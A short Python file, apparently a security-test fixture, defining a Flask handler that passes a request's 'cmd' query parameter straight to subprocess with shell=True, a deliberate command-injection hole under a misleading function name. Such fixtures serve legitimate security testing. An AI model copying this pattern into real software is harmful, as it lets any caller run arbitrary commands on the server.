"""Disposable security-test fixture; not imported or executed by the demo."""
import subprocess
from flask import request

def csrf_repair_probe():
    command = request.args.get("cmd", "echo test")
    return subprocess.check_output(command, shell=True, text=True)
